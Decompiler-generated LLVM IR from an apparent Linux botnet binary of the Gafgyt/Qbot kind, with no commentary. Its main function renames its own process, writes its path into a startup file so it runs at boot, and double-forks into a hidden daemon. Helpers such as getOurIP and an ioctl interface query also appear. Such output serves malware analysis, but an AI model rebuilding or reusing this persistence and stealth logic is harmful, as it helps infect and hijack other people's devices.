dec_label_pc_804cb28:                             ; preds = %dec_label_pc_804cb2b.preheader, %dec_label_pc_804cb28
  %v4_804cb2b49 = phi i32 [ %v5_804cb28, %dec_label_pc_804cb28 ], [ %v2_804cb58, %dec_label_pc_804cb2b.preheader ]
  %v5_804cb28 = add i32 %v4_804cb2b49, 1
  %v22_804cb28 = inttoptr i32 %v5_804cb28 to i8*
  %v2_804cb2e = load i8, i8* %v22_804cb28, align 1
  %v10_804cb30 = icmp eq i8 %v2_804cb2e, 9
  %v1_804cb32 = icmp eq i1 %v10_804cb30, false
  br i1 %v1_804cb32, label %dec_label_pc_804cb28, label %dec_label_pc_804cb34

dec_label_pc_804cb34:                             ; preds = %dec_label_pc_804cb28, %dec_label_pc_804cb2b.preheader
  %storemerge5.lcssa = phi i8* [ %stack_var_-4156, %dec_label_pc_804cb2b.preheader ], [ %v22_804cb28, %dec_label_pc_804cb28 ]
  store i8 0, i8* %storemerge5.lcssa, align 1
  br label %dec_label_pc_804cb76

dec_label_pc_804cb3c:                             ; preds = %dec_label_pc_804cb02
  %v6_804cb50 = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_804cb6a = call i32 @fdgets(i32 %v2_804cb58, i32 4096, i32 %v5_804caf5)
  %v1_804cb72 = icmp eq i32 %v5_804cb6a, 0
  %v1_804cb74 = icmp eq i1 %v1_804cb72, false
  br i1 %v1_804cb74, label %dec_label_pc_804cb02, label %dec_label_pc_804cb76

dec_label_pc_804cb76:                             ; preds = %dec_label_pc_804cae3, %dec_label_pc_804cb3c, %dec_label_pc_804cb34
  %v2_804cb7c = call i32 @__libc_close(i32 %v5_804caf5)
  %v3_804cb84 = load i8, i8* %stack_var_-4156, align 1
  %v4_804cb8a = icmp eq i8 %v3_804cb84, 0
  br i1 %v4_804cb8a, label %dec_label_pc_804cbed, label %dec_label_pc_804cb8e

dec_label_pc_804cb8e:                             ; preds = %dec_label_pc_804cb76
  %v2_804cb98 = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_804cb98, i32* @eax, align 4
  %tmp39 = bitcast i32* %stack_var_-4188 to i8*
  %v5_804cb9f = call i32 @strcpy(i8* %tmp39, i32 %v2_804cb58)
  %v5_804cbb9 = call i32 @ioctl(i32 %v5_804ca1a, i32 35111, i32 %v2_804cb98)
  %v2_804cbd3 = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_804cbca

dec_label_pc_804cbca:                             ; preds = %dec_label_pc_804cb8e, %dec_label_pc_804cbca
  %storemerge40 = phi i32 [ 0, %dec_label_pc_804cb8e ], [ %v4_804cbe4, %dec_label_pc_804cbca ]
  %v2_804cbd9 = add i32 %storemerge40, %v2_804cbd3
  %v1_804cbdc = inttoptr i32 %v2_804cbd9 to i8*
  %v2_804cbdc = load i8, i8* %v1_804cbdc, align 1
  %v3_804cbde = add i32 %storemerge40, ptrtoint (i8** @global_var_805a170.170 to i32)
  %v4_804cbde = inttoptr i32 %v3_804cbde to i8*
  store i8 %v2_804cbdc, i8* %v4_804cbde, align 1
  %v4_804cbe4 = add nuw nsw i32 %storemerge40, 1
  %exitcond = icmp eq i32 %v4_804cbe4, 6
  br i1 %exitcond, label %dec_label_pc_804cbed.loopexit, label %dec_label_pc_804cbca

dec_label_pc_804cbed.loopexit:                    ; preds = %dec_label_pc_804cbca
  br label %dec_label_pc_804cbed

dec_label_pc_804cbed:                             ; preds = %dec_label_pc_804cbed.loopexit, %dec_label_pc_804cb76
  %v2_804cbf3 = call i32 @__libc_close(i32 %v5_804ca1a)
  %v3_804cc09.pre = load i32, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_804cc09

dec_label_pc_804cbfd:                             ; preds = %dec_label_pc_804caae, %dec_label_pc_804ca3a, %entry
  store i32 0, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_804cc09

dec_label_pc_804cc09:                             ; preds = %dec_label_pc_804cbed, %dec_label_pc_804cbfd
  %v3_804cc09 = phi i32 [ %v3_804cc09.pre, %dec_label_pc_804cbed ], [ 0, %dec_label_pc_804cbfd ]
  ret i32 %v3_804cc09

; uselistorder directives
  uselistorder i32 %v5_804cb28, { 1, 0 }
  uselistorder i32 %v2_804cb58, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v5_804caf5, { 2, 1, 0 }
  uselistorder i32 %v5_804ca1a, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-4204, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 4, 2, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @htons, { 10, 9, 8, 7, 6, 5, 4, 11, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804cc09, { 1, 0 }
  uselistorder label %dec_label_pc_804cbca, { 1, 0 }
  uselistorder label %dec_label_pc_804cb76, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804cb28, { 1, 0 }
  uselistorder label %dec_label_pc_804cb02, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_80566a5.171 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i8*, align 4
  %tmp123 = call i32 @__decompiler_undefined_function_0()
  %tmp126 = call i8* @__decompiler_undefined_function_2()
  %tmp135 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-5888 = alloca i8*, align 4
  %stack_var_-5872 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804cc1b = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804cc1b, i32* %stack_var_-24, align 4
  %v5_804cc2c = icmp ult i32* %stack_var_-24, inttoptr (i32 5848 to i32*)
  store i1 %v5_804cc2c, i1* %cf.global-to-local, align 1
  store i32 %v2_804cc1b, i32* %edx.global-to-local, align 4
  %v1_804cc45 = add i32 %v2_804cc1b, 4
  %v2_804cc45 = inttoptr i32 %v1_804cc45 to i32*
  %v3_804cc45 = load i32, i32* %v2_804cc45, align 4
  store i32 %v3_804cc45, i32* %eax.global-to-local, align 4
  %v1_804cc48 = inttoptr i32 %v3_804cc45 to i32*
  %v2_804cc48 = load i32, i32* %v1_804cc48, align 4
  %v1_804cc55 = and i32 %v2_804cc48, -256
  store i32 %v1_804cc55, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804cc58 = inttoptr i32 %v2_804cc48 to i8*
  store i32 %v2_804cc48, i32* @edi, align 4
  %v3_804cc5e = call i32 @_strlen(i8* %v4_804cc58)
  %v4_804cc5e = mul i32 %v3_804cc5e, -1
  %v1_804cc62 = sub i32 1, %v4_804cc5e
  store i32 %v1_804cc62, i32* %eax.global-to-local, align 4
  %v1_804cc64 = sub i32 0, %v4_804cc5e
  store i32 %v1_804cc64, i32* %edx.global-to-local, align 4
  %v3_804cc6d = load i32, i32* %v2_804cc45, align 4
  store i32 %v3_804cc6d, i32* %eax.global-to-local, align 4
  %v1_804cc70 = inttoptr i32 %v3_804cc6d to i32*
  %v2_804cc70 = load i32, i32* %v1_804cc70, align 4
  store i32 %v2_804cc70, i32* %eax.global-to-local, align 4
  %v0_804cc72 = load i32, i32* @esp, align 4
  %v5_804cc72 = icmp ult i32 %v0_804cc72, 4
  store i1 %v5_804cc72, i1* %cf.global-to-local, align 1
  %v5_804cc7b = inttoptr i32 %v2_804cc70 to i8*
  store i8* %v5_804cc7b, i8** %stack_var_-5888, align 4
  %v5_804cc7c = call i32 @strncpy(i8* %v5_804cc7b, i32 ptrtoint (i32* @global_var_80566ac.172 to i32), i32 %v1_804cc64)
  store i32 %v5_804cc7c, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80566ac.172 to i32), i32* %edx.global-to-local, align 4
  store i32 %v2_804cc1b, i32* @esi, align 4
  %v3_804cc8f = load i32, i32* %v2_804cc45, align 4
  %v2_804cc92 = inttoptr i32 %v3_804cc8f to i32*
  store i32 ptrtoint (i32* @global_var_80566ac.172 to i32), i32* %v2_804cc92, align 4
  store i32 ptrtoint (i32* @global_var_80566ac.172 to i32), i32* %eax.global-to-local, align 4
  %v0_804cc97 = load i32, i32* @esp, align 4
  %v5_804cc97 = icmp ult i32 %v0_804cc97, 12
  store i1 %v5_804cc97, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v6_804cca3 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_80566ac.172 to i32), i32 0, i32 0, i32 0)
  store i32 %v6_804cca3, i32* %eax.global-to-local, align 4
  %v5_804ccab = icmp ult i32* %stack_var_-5872, inttoptr (i32 12 to i32*)
  store i1 %v5_804ccab, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v3_804ccb0 = call i32 @__GI_time(i32* null)
  store i32 %v3_804ccb0, i32* %eax.global-to-local, align 4
  %v0_804ccb5 = load i32, i32* @esp, align 4
  %v2_804ccb5 = icmp ugt i32 %v0_804ccb5, -17
  store i1 %v2_804ccb5, i1* %cf.global-to-local, align 1
  store i32 %v3_804ccb0, i32* @ebx, align 4
  %v0_804ccba = call i32 @__libc_getpid()
  %v1_804ccbf = load i32, i32* @ebx, align 4
  %v2_804ccbf = xor i32 %v1_804ccbf, %v0_804ccba
  store i32 %v2_804ccbf, i32* @eax, align 4
  %v0_804ccc1 = load i32, i32* @esp, align 4
  %v5_804ccc1 = icmp ult i32 %v0_804ccc1, 12
  store i1 %v5_804ccc1, i1* %cf.global-to-local, align 1
  %v5_804ccc4 = inttoptr i32 %v2_804ccbf to i8*
  store i8* %v5_804ccc4, i8** %stack_var_-5888, align 4
  %v2_804ccc5 = call i32 @srand(i32 %v2_804ccbf)
  store i32 %v2_804ccc5, i32* %eax.global-to-local, align 4
  store i1 %v5_804ccab, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v3_804ccd2 = call i32 @__GI_time(i32* null)
  store i32 %v3_804ccd2, i32* %eax.global-to-local, align 4
  %v0_804ccd7 = load i32, i32* @esp, align 4
  %v2_804ccd7 = icmp ugt i32 %v0_804ccd7, -17
  store i1 %v2_804ccd7, i1* %cf.global-to-local, align 1
  store i32 %v3_804ccd2, i32* @ebx, align 4
  %v0_804ccdc = call i32 @__libc_getpid()
  %v1_804cce1 = load i32, i32* @ebx, align 4
  %v2_804cce1 = xor i32 %v1_804cce1, %v0_804ccdc
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804cce1, i32* %eax.global-to-local, align 4
  %v1_804cce4 = call i32 @init_rand(i32 %v2_804cce1)
  store i32 %v1_804cce4, i32* @eax, align 4
  %v5_804ccfa = icmp ult i32* %stack_var_-5872, inttoptr (i32 8 to i32*)
  store i1 %v5_804ccfa, i1* %cf.global-to-local, align 1
  %tmp182 = bitcast i8** %stack_var_-5888 to i32*
  store i32 ptrtoint ([19 x i8]* @global_var_80566ad.173 to i32), i32* %tmp182, align 4
  %v3_804cd05 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_80566ad.173 to i32), i32 ptrtoint (i32* @global_var_80566c0.174 to i32))
  store i32 %v3_804cd05, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cd10 = icmp eq i32 %v3_804cd05, 0
  %v1_804cd14 = icmp eq i1 %v4_804cd10, false
  br i1 %v1_804cd14, label %dec_label_pc_804cd33, label %dec_label_pc_804cd16

dec_label_pc_804cd16:                             ; preds = %entry
  store i1 %v5_804ccfa, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_80566c2.175 to i32), i32* %tmp182, align 4
  %v3_804cd28 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_80566c2.175 to i32), i32 ptrtoint (i32* @global_var_80566c0.174 to i32))
  store i32 %v3_804cd28, i32* %eax.global-to-local, align 4
  %v0_804cd2d = load i32, i32* @esp, align 4
  %v2_804cd2d = icmp ugt i32 %v0_804cd2d, -17
  store i1 %v2_804cd2d, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cd33

dec_label_pc_804cd33:                             ; preds = %entry, %dec_label_pc_804cd16
  %stack_var_-88.0 = phi i32 [ %v3_804cd05, %entry ], [ %v3_804cd28, %dec_label_pc_804cd16 ]
  %v3_804ce8313 = phi i32 [ ptrtoint ([19 x i8]* @global_var_80566ad.173 to i32), %entry ], [ ptrtoint ([13 x i8]* @global_var_80566c2.175 to i32), %dec_label_pc_804cd16 ]
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cd33 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v4_804cd33, label %dec_label_pc_804ceda, label %dec_label_pc_804cd3d

dec_label_pc_804cd3d:                             ; preds = %dec_label_pc_804cd33
  %v3_804cd43 = load i32, i32* %v2_804cc45, align 4
  store i32 %v3_804cd43, i32* %eax.global-to-local, align 4
  %v1_804cd46 = inttoptr i32 %v3_804cd43 to i32*
  %v2_804cd46 = load i32, i32* %v1_804cd46, align 4
  %v1_804cd53 = and i32 %v2_804cd46, -256
  store i32 %v1_804cd53, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804cd56 = inttoptr i32 %v2_804cd46 to i8*
  store i32 %v2_804cd46, i32* @edi, align 4
  %v3_804cd5c = call i32 @_strlen(i8* %v4_804cd56)
  %v0_804cd6d = load i32, i32* @esp, align 4
  %v5_804cd6d = icmp ult i32 %v0_804cd6d, 8
  store i1 %v5_804cd6d, i1* %cf.global-to-local, align 1
  %v2_804cd75 = ptrtoint i32* %stack_var_-368 to i32
  store i32 %v2_804cd75, i32* %eax.global-to-local, align 4
  %tmp183 = bitcast i32* %stack_var_-368 to i8*
  store i8* %tmp183, i8** %stack_var_-5888, align 4
  %v3_804cd7c = call i32 @getcwd(i32 %v2_804cd75, i32 256)
  %v0_804cd81 = load i32, i32* @esp, align 4
  %v2_804cd81 = icmp ugt i32 %v0_804cd81, -17
  store i1 %v2_804cd81, i1* %cf.global-to-local, align 1
  store i32 %v2_804cd75, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_804cd75, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_80566cf.176 to i32), i32* @edi, align 4
  %v7_804cdb7 = call i32 @_strncmp(i8* %tmp183, i8* bitcast (i8** @global_var_80566cf.176 to i8*), i32 2)
  %v8_804cdb7 = urem i32 %v7_804cdb7, 2
  %v9_804cdb7 = icmp eq i32 %v8_804cdb7, 0
  %v0_804cdb9 = load i1, i1* %cf.global-to-local, align 1
  %v2_804cdb9 = or i1 %v0_804cdb9, %v9_804cdb7
  %v3_804cdb9 = zext i1 %v2_804cdb9 to i32
  %v4_804cdb9 = load i32, i32* @edx, align 4
  %v5_804cdb9 = and i32 %v4_804cdb9, -256
  %v6_804cdb9 = or i32 %v3_804cdb9, %v5_804cdb9
  %v7_804cdb9 = xor i32 %v6_804cdb9, 1
  store i32 %v7_804cdb9, i32* %edx.global-to-local, align 4
  %v5_804cdbc = ptrtoint i32* %stack_var_-512 to i32
  %v3_804cdbf = and i32 %v7_804cdb7, -256
  %v1_804cdc1 = trunc i32 %v7_804cdb9 to i8
  %v3_804cdc1 = trunc i32 %v5_804cdbc to i8
  %v4_804cdc1 = sub i8 %v1_804cdc1, %v3_804cdc1
  %v15_804cdc1 = icmp eq i8 %v4_804cdc1, 0
  %v20_804cdc1 = zext i8 %v4_804cdc1 to i32
  %v23_804cdc1 = or i32 %v20_804cdc1, %v3_804cdbf
  store i32 %v23_804cdc1, i32* @ecx, align 4
  %v2_804cdc5 = sext i8 %v4_804cdc1 to i32
  store i32 %v2_804cdc5, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_804cdc1, label %dec_label_pc_804cecc, label %dec_label_pc_804cdd5.preheader

dec_label_pc_804cdd5.preheader:                   ; preds = %dec_label_pc_804cd3d
  br label %dec_label_pc_804cdd5

dec_label_pc_804cdd2:                             ; preds = %dec_label_pc_804cdd5
  %v4_804cdd2 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_804cdd5

dec_label_pc_804cdd5:                             ; preds = %dec_label_pc_804cdd5.preheader, %dec_label_pc_804cdd2
  %stack_var_-84.0 = phi i32 [ %v4_804cdd2, %dec_label_pc_804cdd2 ], [ %v3_804cd5c, %dec_label_pc_804cdd5.preheader ]
  store i32 %v2_804cc1b, i32* @esi, align 4
  %v3_804cddb = load i32, i32* %v2_804cc45, align 4
  store i32 %v3_804cddb, i32* %eax.global-to-local, align 4
  %v1_804cdde = inttoptr i32 %v3_804cddb to i32*
  %v2_804cdde = load i32, i32* %v1_804cdde, align 4
  store i32 %v2_804cdde, i32* %edx.global-to-local, align 4
  %v2_804cde3 = add i32 %v2_804cdde, %stack_var_-84.0
  store i32 %v2_804cde3, i32* %eax.global-to-local, align 4
  %v1_804cde6 = inttoptr i32 %v2_804cde3 to i8*
  %v2_804cde6 = load i8, i8* %v1_804cde6, align 1
  %v3_804cde6 = zext i8 %v2_804cde6 to i32
  %v5_804cde6 = and i32 %v2_804cde3, -256
  %v6_804cde6 = or i32 %v3_804cde6, %v5_804cde6
  store i32 %v6_804cde6, i32* %eax.global-to-local, align 4
  %v6_804cde8 = icmp ult i8 %v2_804cde6, 47
  store i1 %v6_804cde8, i1* %cf.global-to-local, align 1
  %v10_804cde8 = icmp eq i8 %v2_804cde6, 47
  %v1_804cdea = icmp eq i1 %v10_804cde8, false
  br i1 %v1_804cdea, label %dec_label_pc_804cdd2, label %dec_label_pc_804cdec

dec_label_pc_804cdec:                             ; preds = %dec_label_pc_804cdd5
  store i32 %v2_804cc1b, i32* @edi, align 4
  %v3_804cdf2 = load i32, i32* %v2_804cc45, align 4
  store i32 %v3_804cdf2, i32* %eax.global-to-local, align 4
  %v1_804cdf5 = inttoptr i32 %v3_804cdf2 to i32*
  %v2_804cdf5 = load i32, i32* %v1_804cdf5, align 4
  store i32 %v2_804cdf5, i32* %edx.global-to-local, align 4
  %v2_804cdfa = add i32 %v2_804cdf5, %stack_var_-84.0
  %v2_804ce0a = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_804ce0a, i32* %eax.global-to-local, align 4
  %tmp184 = bitcast i32* %stack_var_-624 to i8*
  store i8* %tmp184, i8** %stack_var_-5888, align 4
  %v5_804ce11 = call i32 @sprintf(i32 %v2_804ce0a, i32 ptrtoint ([8 x i8]* @global_var_80566d1.177 to i32), i32 %v2_804cd75, i32 %v2_804cdfa)
  store i32 %v5_804ce11, i32* %eax.global-to-local, align 4
  %v0_804ce16 = load i32, i32* @esp, align 4
  %v2_804ce16 = icmp ugt i32 %v0_804ce16, -17
  store i1 %v2_804ce16, i1* %cf.global-to-local, align 1
  %v8_804ce58 = inttoptr i32 %stack_var_-88.0 to i8*
  %tmp185 = inttoptr i32 %stack_var_-88.0 to i32*
  %v2_804ce26 = ptrtoint i32* %stack_var_-1648 to i32
  %tmp186 = bitcast i32* %stack_var_-1648 to i8*
  %v5_804ce1b = icmp ult i32* %stack_var_-5872, inttoptr (i32 4 to i32*)
  br label %dec_label_pc_804ce55.outer

dec_label_pc_804ce1b:                             ; preds = %dec_label_pc_804ce55
  store i1 %v5_804ce1b, i1* %cf.global-to-local, align 1
  store i32 %v2_804ce26, i32* %eax.global-to-local, align 4
  store i8* %tmp186, i8** %stack_var_-5888, align 4
  %v4_804ce2d = call i32 @fgets(i32 %v2_804ce26, i32 1024, i32 %stack_var_-88.0)
  store i1 %v5_804ccfa, i1* %cf.global-to-local, align 1
  store i32 %v2_804ce26, i32* %eax.global-to-local, align 4
  store i8* %tmp186, i8** %stack_var_-5888, align 4
  %v4_804ce46 = call i32 @__GI_strcasecmp(i8* %tmp186, i32 %v2_804ce0a)
  store i32 %v4_804ce46, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ce4e = icmp eq i32 %v4_804ce46, 0
  %v1_804ce50 = icmp eq i1 %v1_804ce4e, false
  br i1 %v1_804ce50, label %dec_label_pc_804ce55, label %dec_label_pc_804ce52

dec_label_pc_804ce52:                             ; preds = %dec_label_pc_804ce1b
  %v4_804ce52 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804ce55.outer

dec_label_pc_804ce55.outer:                       ; preds = %dec_label_pc_804ce52, %dec_label_pc_804cdec
  %stack_var_-80.0.ph = phi i32 [ %v4_804ce52, %dec_label_pc_804ce52 ], [ 0, %dec_label_pc_804cdec ]
  br label %dec_label_pc_804ce55

dec_label_pc_804ce55:                             ; preds = %dec_label_pc_804ce55.outer, %dec_label_pc_804ce1b
  store i1 %v5_804ccab, i1* %cf.global-to-local, align 1
  store i8* %v8_804ce58, i8** %stack_var_-5888, align 4
  %v3_804ce5b = call i32 @feof(i32* %tmp185)
  store i32 %v3_804ce5b, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ce63 = icmp eq i32 %v3_804ce5b, 0
  br i1 %v1_804ce63, label %dec_label_pc_804ce1b, label %dec_label_pc_804ce67

dec_label_pc_804ce67:                             ; preds = %dec_label_pc_804ce55
  %v4_804ce67 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v1_804ce6b = icmp eq i1 %v4_804ce67, false
  store i1 %v5_804ccab, i1* %cf.global-to-local, align 1
  store i8* %v8_804ce58, i8** %stack_var_-5888, align 4
  %tmp187 = inttoptr i32 %stack_var_-88.0 to i16*
  %v3_804cec2 = call i32 @__GI_fclose(i16* %tmp187)
  store i32 %v3_804cec2, i32* @eax, align 4
  %v0_804cec7 = load i32, i32* @esp, align 4
  %v2_804cec7 = icmp ugt i32 %v0_804cec7, -17
  store i1 %v2_804cec7, i1* %cf.global-to-local, align 1
  br i1 %v1_804ce6b, label %dec_label_pc_804ceda, label %dec_label_pc_804ce6d

dec_label_pc_804ce6d:                             ; preds = %dec_label_pc_804ce67
  store i1 %v5_804ccfa, i1* %cf.global-to-local, align 1
  store i32 %v3_804ce8313, i32* %tmp182, align 4
  %v3_804ce86 = call i32 @__GI_fopen(i32 %v3_804ce8313, i32 ptrtoint (i32* @global_var_80566d9.178 to i32))
  store i32 %v3_804ce86, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ce91 = icmp eq i32 %v3_804ce86, 0
  br i1 %v4_804ce91, label %dec_label_pc_804ceda, label %dec_label_pc_804ce97

dec_label_pc_804ce97:                             ; preds = %dec_label_pc_804ce6d
  store i1 %v5_804ccfa, i1* %cf.global-to-local, align 1
  store i32 %v2_804ce0a, i32* %eax.global-to-local, align 4
  store i8* %tmp184, i8** %stack_var_-5888, align 4
  %v3_804cea4 = call i32 @__GI_fputs(i32 %v2_804ce0a, i32 %v3_804ce86)
  store i32 %v3_804cea4, i32* @eax, align 4
  store i1 %v5_804ccab, i1* %cf.global-to-local, align 1
  %v8_804ceaf = inttoptr i32 %v3_804ce86 to i8*
  store i8* %v8_804ceaf, i8** %stack_var_-5888, align 4
  %tmp188 = inttoptr i32 %v3_804ce86 to i16*
  %v3_804ceb2 = call i32 @__GI_fclose(i16* %tmp188)
  store i32 %v3_804ceb2, i32* %eax.global-to-local, align 4
  %v0_804ceb7 = load i32, i32* @esp, align 4
  %v2_804ceb7 = icmp ugt i32 %v0_804ceb7, -17
  store i1 %v2_804ceb7, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ceda

dec_label_pc_804cecc:                             ; preds = %dec_label_pc_804cd3d
  %v0_804cecc = load i32, i32* @esp, align 4
  %v5_804cecc = icmp ult i32 %v0_804cecc, 12
  store i1 %v5_804cecc, i1* %cf.global-to-local, align 1
  %v8_804cecf = inttoptr i32 %stack_var_-88.0 to i8*
  store i8* %v8_804cecf, i8** %stack_var_-5888, align 4
  %tmp189 = inttoptr i32 %stack_var_-88.0 to i16*
  %v3_804ced2 = call i32 @__GI_fclose(i16* %tmp189)
  store i32 %v3_804ced2, i32* %eax.global-to-local, align 4
  %v0_804ced7 = load i32, i32* @esp, align 4
  %v2_804ced7 = icmp ugt i32 %v0_804ced7, -17
  store i1 %v2_804ced7, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ceda

dec_label_pc_804ceda:                             ; preds = %dec_label_pc_804ce67, %dec_label_pc_804ce6d, %dec_label_pc_804cd33, %dec_label_pc_804ce97, %dec_label_pc_804cecc
  %v0_804ceda = call i32 @getOurIP()
  store i32 %v0_804ceda, i32* %eax.global-to-local, align 4
  %v0_804cedf = load i8*, i8** %stack_var_-5888, align 4
  %v1_804cedf = ptrtoint i8* %v0_804cedf to i32
  %v2_804cedf = call i32 @__libc_fork(i32 %v1_804cedf)
  store i32 %v2_804cedf, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cee7 = icmp eq i32 %v2_804cedf, 0
  br i1 %v4_804cee7, label %dec_label_pc_804cf11, label %dec_label_pc_804cf42

dec_label_pc_804cf11:                             ; preds = %dec_label_pc_804ceda
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804cf11 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804cf11 = ptrtoint i8* %v0_804cf11 to i32
  %v2_804cf11 = call i32 @__libc_fork(i32 %v1_804cf11)
  store i32 %v2_804cf11, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cf19 = icmp eq i32 %v2_804cf11, 0
  br i1 %v4_804cf19, label %dec_label_pc_804cf29.thread, label %dec_label_pc_804cf2f

dec_label_pc_804cf29.thread:                      ; preds = %dec_label_pc_804cf11
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cf53

dec_label_pc_804cf2f:                             ; preds = %dec_label_pc_804cf11
  %v0_804cf1f = load i32, i32* @esp, align 4
  %v5_804cf1f = icmp ult i32 %v0_804cf1f, 12
  store i1 %v5_804cf1f, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v2_804cf24 = call i32 @__GI_exit(i32 0)
  store i32 ptrtoint ([13 x i8]* @global_var_80566db.179 to i32), i32* %eax.global-to-local, align 4
  %v0_804cf34 = load i32, i32* @esp, align 4
  %v5_804cf34 = icmp ult i32 %v0_804cf34, 12
  store i1 %v5_804cf34, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80566db.179, i32 0, i32 0), i8** %stack_var_-5888, align 4
  %v2_804cf38 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_80566db.179 to i32))
  store i32 %v2_804cf38, i32* %eax.global-to-local, align 4
  %v0_804cf3d = load i32, i32* @esp, align 4
  %v2_804cf3d = icmp ugt i32 %v0_804cf3d, -17
  store i1 %v2_804cf3d, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cf53

dec_label_pc_804cf42:                             ; preds = %dec_label_pc_804ceda
  %v0_804ceed = load i32, i32* @esp, align 4
  %v5_804ceed = icmp ult i32 %v0_804ceed, 4
  store i1 %v5_804ceed, i1* %cf.global-to-local, align 1
  %v2_804cef2 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_804cef2, i32* %eax.global-to-local, align 4
  %v8_804cef6 = inttoptr i32 %v2_804cedf to i8*
  store i8* %v8_804cef6, i8** %stack_var_-5888, align 4
  %v4_804cef9 = call i32 @__libc_waitpid(i32 %v2_804cedf, i32 %v2_804cef2, i32 0)
  store i32 %v4_804cef9, i32* @eax, align 4
  store i1 %v5_804ccab, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v2_804cf06 = call i32 @__GI_exit(i32 0)
  store i32 ptrtoint ([13 x i8]* @global_var_80566db.179 to i32), i32* %eax.global-to-local, align 4
  %v0_804cf47 = load i32, i32* @esp, align 4
  %v5_804cf47 = icmp ult i32 %v0_804cf47, 12
  store i1 %v5_804cf47, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80566db.179, i32 0, i32 0), i8** %stack_var_-5888, align 4
  %v2_804cf4b = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_80566db.179 to i32))
  store i32 %v2_804cf4b, i32* %eax.global-to-local, align 4
  %v0_804cf50 = load i32, i32* @esp, align 4
  %v2_804cf50 = icmp ugt i32 %v0_804cf50, -17
  store i1 %v2_804cf50, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cf53

dec_label_pc_804cf53:                             ; preds = %dec_label_pc_804cf29.thread, %dec_label_pc_804cf2f, %dec_label_pc_804cf42
  %v0_804cf53 = call i32 @__GI_setsid()
  store i32 %v0_804cf53, i32* %eax.global-to-local, align 4
  %v0_804cf58 = load i32, i32* @esp, align 4
  %v5_804cf58 = icmp ult i32 %v0_804cf58, 12
  store i1 %v5_804cf58, i1* %cf.global-to-local, align 1
  store i8* bitcast (i8** @global_var_80566cf.176 to i8*), i8** %stack_var_-5888, align 4
  %v2_804cf60 = call i32 @chdir(i32 ptrtoint (i8** @global_var_80566cf.176 to i32))
  store i32 %v2_804cf60, i32* %eax.global-to-local, align 4
  store i1 %v5_804ccfa, i1* %cf.global-to-local, align 1
